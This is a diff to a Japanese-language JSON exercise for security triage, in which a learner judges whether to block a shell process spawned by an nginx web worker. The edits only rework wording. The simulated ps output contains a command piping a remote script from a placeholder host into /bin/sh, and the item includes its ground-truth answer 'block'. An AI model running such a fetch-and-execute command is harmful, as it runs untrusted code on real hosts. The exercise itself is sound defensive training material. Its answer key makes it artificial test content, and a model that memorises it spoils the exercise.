@@ -5,8 +5,8 @@
   "platform": "linux",
   "level": "intermediate",
   "ground_truth": "block",
-  "title": "Web Workerからの外部取得",
-  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "title": "Webワーカーからの外部取得",
+  "request": "稼働中のプロセスを継続させますか。 ALLOW / BLOCKで判断してください。",
   "initial_information": {
     "Process": "sh",
     "PID": 4200,
@@ -21,7 +21,7 @@
     {
       "id": "ps",
       "name": "ps",
-      "description": "選択PIDのUser・親PID・Command Lineを確認します。",
+      "description": "選択PIDのユーザー・親PID・コマンドラインを確認します。",
       "output": "Commandの抜粋\nUSER PID PPID ELAPSED COMMAND\nwww-data 4200 3100 00:10 /bin/sh -c \"curl https://worker-assets.example/a.sh | /bin/sh 〔引数を省略〕\"",
       "accepted_information_types": [
         "pid"
@@ -41,7 +41,7 @@
     {
       "id": "pstree",
       "name": "pstree",
-      "description": "選択PIDの祖先ProcessのChainを確認します。",
+      "description": "選択PIDの祖先プロセスの連鎖を確認します。",
       "output": "systemd(1)---nginx(900)---web-worker(3100)---sh(4200)\n表示: 選択PIDの祖先Chain",
       "accepted_information_types": [
         "pid"
@@ -61,7 +61,7 @@
     {
       "id": "systemctl",
       "name": "systemctl",
-      "description": "選択PIDの所属Unit・状態・構成を表示します。",
+      "description": "選択PIDの所属ユニット・状態・構成を表示します。",
       "output": "PID 4200 の所属Unit: nginx.service\nControlGroup: /system.slice/nginx.service\nUnitのActiveState: active\n選択PIDはMainPIDではなく子Process。",
       "accepted_information_types": [
         "pid"
@@ -82,8 +82,8 @@
   "references": [
     {
       "id": "service",
-      "name": "Service構成台帳",
-      "content": "web-workerは静的コンテンツの配信のみ。外部Scriptの取得・起動は禁止。保守は運用Userの専用Jobで実施。"
+      "name": "サービス構成台帳",
+      "content": "web-workerは静的コンテンツの配信のみ。外部スクリプトの取得・起動は禁止。保守は運用ユーザーの専用ジョブで実施。"
     }
   ],
   "external_references": [],
@@ -377,16 +377,16 @@
       ]
     }
   ],
-  "explanation": "Web Worker配下のShellが外部Scriptを取得・実行するCommandを動かしており、静的サイトの承認構成に反するため停止します。Shell名だけではなく親子関係とCommandを根拠にします。",
-  "topic": "親子関係・CommandとServiceの責務を比較する",
-  "summary": "親子関係・CommandとServiceの責務を比較する",
+  "explanation": "Webワーカー配下のシェルが外部スクリプトを取得・実行するコマンドを動かしており、静的サイトの承認構成に反するため停止します。シェル名だけではなく親子関係とコマンドを根拠にします。",
+  "topic": "親子関係・コマンドとサービスの責務を比較する",
+  "summary": "親子関係・コマンドとサービスの責務を比較する",
   "learning_objectives": [
-    "親子関係・CommandとServiceの責務を比較する"
+    "親子関係・コマンドとサービスの責務を比較する"
   ],
   "decision_context": "running_process",
   "scenario_type": "standard",
   "sources": [
     "https://www.freedesktop.org/software/systemd/man/latest/systemctl.html"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。Command・Sourceの〔…を省略〕は教材の編集箇所。実行可能なPayloadは配布しない。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。"
+  "fixture_note": "登場する組織名、ドメイン、IPアドレス、パッケージ名、ハッシュ値、記録は架空のものです。IPアドレスには文書用アドレスを使い、RDAPや外部評判の照会も実際には行っていません。時刻は2026-08-18を基準とし、必要な項目だけを抜粋しています。コマンド欄やソース欄の「〔…を省略〕」は、教材で省いた箇所を示します。実行可能なペイロードは配布していません。各問題は独立した端末・案件の状態を表すスナップショットです。PIDや時刻の再利用は問題間の関連を意味しません。Z付きの時刻を除き、時刻はすべて日本標準時（JST）です。"
 }
